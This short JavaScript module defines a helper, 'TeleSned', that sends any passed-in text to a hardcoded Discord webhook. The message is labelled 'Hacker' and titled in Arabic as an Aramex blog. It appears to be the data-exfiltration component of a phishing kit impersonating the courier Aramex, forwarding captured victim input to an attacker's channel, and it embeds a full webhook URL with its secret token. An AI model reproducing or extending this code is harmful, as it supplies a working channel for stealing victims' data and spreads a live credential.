import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328489944536190986/5sPjq3Ik9VflkINp3katyXjbugte7eYjorAykEdnungVBZmBJ1dGhE9ZNP52mVX6mc6e",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
